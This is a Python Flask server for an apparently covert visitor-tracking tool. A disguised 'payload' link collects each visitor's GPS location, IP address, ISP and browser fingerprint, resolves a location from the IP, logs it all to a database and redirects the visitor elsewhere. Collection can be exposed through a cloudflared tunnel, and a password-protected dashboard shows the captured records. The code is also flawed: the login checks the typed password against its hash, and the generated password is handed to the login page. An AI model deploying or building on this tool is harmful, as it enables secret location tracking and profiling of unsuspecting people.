
import os
import sqlite3
import argparse
import random
import string
from hashlib import sha256
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, session, send_from_directory, current_app
from marshmallow import Schema, fields, validate, ValidationError
import logging
import requests
from src.Cloudflared import Cloudflared
import time

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Use a secure random key for session management


# Set up logging to file
log_file_path = 'etc/flask_app.log'
logging.basicConfig(filename=log_file_path,
                    level=logging.INFO,
                    format='%(asctime)s [%(levelname)s]: %(message)s')

db_dir = 'etc'
if not os.path.exists(db_dir):
    os.makedirs(db_dir)

# Configure SQLite database
db_path = os.path.join(db_dir, 'clients.db')
main_route = "/"


# Initialize the database and create tables if they don't exist
def init_db():
    with sqlite3.connect(db_path) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                latitude REAL,
                longitude REAL,
                public_ip TEXT NOT NULL,
                isp TEXT NOT NULL,
                user_agent TEXT NOT NULL,
                platform TEXT NOT NULL,
                screen_width INTEGER NOT NULL,
                screen_height INTEGER NOT NULL,
                color_depth INTEGER NOT NULL,
                viewport_width INTEGER NOT NULL,
                viewport_height INTEGER NOT NULL,
                is_online TEXT NOT NULL,
                language TEXT NOT NULL,
                language_preferences TEXT NOT NULL,
                timezone TEXT NOT NULL,
                cookies_enabled TEXT NOT NULL,
                do_not_track TEXT NOT NULL,
                connection_type TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()


# Define the schema for validating incoming user data
class UserInfoSchema(Schema):
    latitude = fields.Float(required=False)
    longitude = fields.Float(required=False)
    publicIP = fields.Str(required=True)
    isp = fields.Str(required=True)
    userAgent = fields.Str(required=True)
    platform = fields.Str(required=True)
    screenWidth = fields.Int(required=True)
    screenHeight = fields.Int(required=True)
    colorDepth = fields.Int(required=True)
    viewportWidth = fields.Int(required=True)
    viewportHeight = fields.Int(required=True)
    isOnline = fields.Str(required=True, validate=validate.OneOf(["Online", "Offline", "Unknown"]))
    language = fields.Str(required=True)
    languagePreferences = fields.Str(required=True)
    timezone = fields.Str(required=True)
    cookiesEnabled = fields.Str(required=True, validate=validate.OneOf(["Yes", "No", "Unknown"]))
    doNotTrack = fields.Str(required=True, validate=validate.OneOf(["Yes", "No", "Unknown"]))
    connectionType = fields.Str(required=True)
    timestamp = fields.Str(required=True)


# Generate a random password for the /clients route
def generate_password(length=30):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))


@app.route('/favicon.ico')
def favicon():
    return send_from_directory("static", 'favicon.ico', mimetype='image/vnd.microsoft.icon')


# Authentication route for /clients
@app.route("/clients", methods=["GET", "POST"])
def clients():
    if request.method == "POST":
        # Initialize the attempts counter in session if it doesn't exist
        if 'attempts' not in session:
            session['attempts'] = 0

        if session['attempts'] >= 3:
            return render_template("login.html", error="Too many failed attempts you have been locked out.")

        # Check if the password matches
        password = request.form.get('password')
        if password != clients_password_hash:
            session['attempts'] += 1  # Increment the attempts counter

            return render_template("login.html",
                                   error=f"Incorrect password.")

        # Reset attempts on successful authentication
        session['authenticated'] = True
        session.pop('attempts', None)  # Clear attempts on success
        return redirect("/clients")  # Redirect to the same route

    # Fetch user information from the database if authenticated
    if session.get('authenticated'):
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM user_info")  # Fetch all records
            user_info_records = cursor.fetchall()

        # Convert the records to a list of dictionaries for easy rendering in the template
        user_info_list = []
        for record in user_info_records:
            user_info_list.append({
                "latitude": record[1],
                "longitude": record[2],
                "public_ip": record[3],
                "isp": record[4],
                "user_agent": record[5],
                "platform": record[6],
                "screen_width": record[7],
                "screen_height": record[8],
                "color_depth": record[9],
                "viewport_width": record[10],
                "viewport_height": record[11],
                "is_online": record[12],
                "language": record[13],
                "language_preferences": record[14],
                "timezone": record[15],
                "cookies_enabled": record[16],
                "do_not_track": record[17],
                "connection_type": record[18],
                "timestamp": record[19],
            })

        return render_template("clients.html", user_info=user_info_list)

    # If not authenticated, show the login form
    return render_template("login.html", password=clients_password)


@app.route('/clear-database', methods=['POST'])
def clear_database():
    if not session.get('authenticated'):
        return jsonify({"status": "error", "message": "Unauthorized access"}), 403

    try:
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("DELETE FROM user_info")  # Clear all records from the user_info table
            conn.commit()
        logging.info("Database cleared successfully.")
        return jsonify({"status": "success", "message": "Database cleared."}), 200
    except Exception as e:
        logging.error(f"Error clearing database: {str(e)}")
        return jsonify({"status": "error", "message": "Error clearing database."}), 500


@app.route('/login')
def login():
    return render_template('login.html', redirect_url=redirect_url)


@app.route(main_route)
def index():
    # Render the HTML template with JavaScript for getting geolocation
    return render_template('index.html', redirect_url=redirect_url, attempt_geolocation=gps)


@app.route('/user_info', methods=['POST'])
def user_info():
    user_data = request.json

    # Validate incoming data
    schema = UserInfoSchema()
    formatted_date = datetime.now().strftime("%d-%m-%y %H:%M")
    user_data["timestamp"] = formatted_date
    try:
        validated_data = schema.load(user_data)
    except ValidationError as err:
        return jsonify(err.messages), 400  # Return 400 for bad request

    # Check if latitude and longitude are missing
    latitude = validated_data.get('latitude', 0.0)
    longitude = validated_data.get('longitude', 0.0)
    public_ip = validated_data.get('publicIP', "Unknown")

    if (latitude <= 0 or longitude <= 0) and public_ip != "Unknown":
        # Call the IP geolocation service
        response = requests.get(f'https://ipinfo.io/{public_ip}/json')
        if response.status_code == 200:
            geo_info = response.json()
            latitude = geo_info.get('loc', '').split(',')[0]
            longitude = geo_info.get('loc', '').split(',')[1]
            validated_data['latitude'] = float(latitude)
            validated_data['longitude'] = float(longitude)

    # Insert the new UserInfo instance into the database
    with sqlite3.connect(db_path) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO user_info (
                latitude, longitude, public_ip, isp, user_agent,
                platform, screen_width, screen_height, color_depth,
                viewport_width, viewport_height, is_online, language,
                language_preferences, timezone, cookies_enabled, do_not_track,
                connection_type, timestamp
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            validated_data.get('latitude', 0.0),
            validated_data.get('longitude', 0.0),
            validated_data.get('publicIP', "Unknown"),
            validated_data.get('isp', "Unknown"),
            validated_data.get('userAgent', "Unknown"),
            validated_data.get('platform', "Unknown"),
            validated_data.get('screenWidth', 0),
            validated_data.get('screenHeight', 0),
            validated_data.get('colorDepth', 0),
            validated_data.get('viewportWidth', 0),
            validated_data.get('viewportHeight', 0),
            validated_data.get('isOnline', "Unknown"),
            validated_data.get('language', "Unknown"),
            validated_data.get('languagePreferences', "Unknown"),
            validated_data.get('timezone', "Unknown"),
            validated_data.get('cookiesEnabled', "Unknown"),
            validated_data.get('doNotTrack', "Unknown"),
            validated_data.get('connectionType', "Unknown"),
            validated_data.get("timestamp", "Unknown")

        ))
        conn.commit()

    return jsonify({"status": "success", "redirect": redirect_url})


def parse_args():
    parser = argparse.ArgumentParser(description='Run the Flask application.')
    parser.add_argument('--redirect_url', type=str, required=True, help='URL to redirect to after form submission.')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode.')
    parser.add_argument('--ssl_cert', type=str, help='Path to the SSL certificate file.')
    parser.add_argument('--ssl_key', type=str, help='Path to the SSL key file.')
    parser.add_argument('--gps', action='store_true', help='Enable GPS functionality.')
    parser.add_argument("--cloudflared", action="store_true", help="Use cloudflared tunnel")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    init_db()
    redirect_url = args.redirect_url  # Store redirect_url from args
    gps = args.gps

    # Store the generated password
    clients_password = generate_password()
    clients_password_hash = sha256(clients_password.encode()).hexdigest()

    print(f"Login password: {clients_password}")

    # Run the Flask application with SSL if specified
    if args.cloudflared:
        cf = Cloudflared(flask_app=app, download_dir="etc")
        try:
            print("Statistics URL: http://127.0.0.1:5000/clients")
            cf_url = cf.start()
            print(f"Cloudflared URL: {cf_url}")
            while cf.flask_thread:
                time.sleep(1)
        except KeyboardInterrupt:
            print()
            print("Stopping cloudflared tunnel")
            cf.stop()

    elif args.ssl_cert and args.ssl_key:
        print("Statistics URL: https://127.0.0.1:5000/clients")
        print("Payload URL: https://127.0.0.1:5000/")
        app.run(debug=args.debug, ssl_context=(args.ssl_cert, args.ssl_key))

    else:
        print("Statistics URL: http://127.0.0.1:5000/clients")
        print("Payload URL: http://127.0.0.1:5000/")
        app.run(debug=args.debug)
